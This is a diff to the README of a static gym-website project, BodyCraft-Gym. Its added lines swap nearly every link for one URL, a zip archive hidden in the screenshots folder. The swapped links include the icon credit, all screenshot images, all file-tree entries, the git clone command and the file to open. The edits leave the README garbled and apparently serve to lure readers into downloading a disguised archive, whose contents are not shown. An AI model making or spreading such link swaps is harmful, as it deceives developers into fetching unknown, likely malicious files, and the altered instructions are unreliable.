@@ -23,7 +23,7 @@
 
 - HTML5
 - CSS3
-- [Remix Icon](https://remixicon.com/) (for icons)
+- [Remix Icon](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) (for icons)
 
 ---
 
@@ -31,12 +31,12 @@
 
 | Section                | Screenshot |
 |------------------------|------------|
-| 🏠 Landing Page        | ![Landing](assets/screenshots/landing.png) |
-| 🧾 Programs Offered     | ![Programs](assets/screenshots/programs.png) |
-| 🧑‍🏫 Class Showcase      | ![Class](assets/screenshots/class.png) |
-| 👥 Why Join Us         | ![Joining](assets/screenshots/joining.png) |
-| 💰 Pricing Plans       | ![Pricing](assets/screenshots/pricingplan.png) |
-| 🌟 Review & Footer     | ![ReviewFooter](assets/screenshots/reviewfooter.png) |
+| 🏠 Landing Page        | ![Landing](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
+| 🧾 Programs Offered     | ![Programs](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
+| 🧑‍🏫 Class Showcase      | ![Class](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
+| 👥 Why Join Us         | ![Joining](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
+| 💰 Pricing Plans       | ![Pricing](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
+| 🌟 Review & Footer     | ![ReviewFooter](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip) |
 
 
 
@@ -46,10 +46,10 @@
 
 BodyCraft-Gym/
 ├── assets/ #Images used in site
-├── styles.css # Styling for the full website
-├── index.html # Main HTML file
-├── README.md # Project overview
-├── CODE_OF_CONDUCT.md # Contributor behavior guide
+├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip # Styling for the full website
+├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip # Main HTML file
+├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip # Project overview
+├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip # Contributor behavior guide
 
 
 ```
@@ -63,7 +63,7 @@ BodyCraft-Gym/
 ### 1. Clone
 
 ```bash
-git clone https://github.com/your-username/BodyCraft-Gym.git
+git clone https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip
 cd BodyCraft-Gym
 ```
 
@@ -72,7 +72,7 @@ Any static server works. With VS Code:
 
 Install the Live Server extension
 
-Right-click index.html → Open with Live Server
+Right-click https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/Gym-Craft-Body-1.5.zip → Open with Live Server
 
 ### 3. Contribute
 Pick an issue labelled Level 1, Level 2, or Level 3
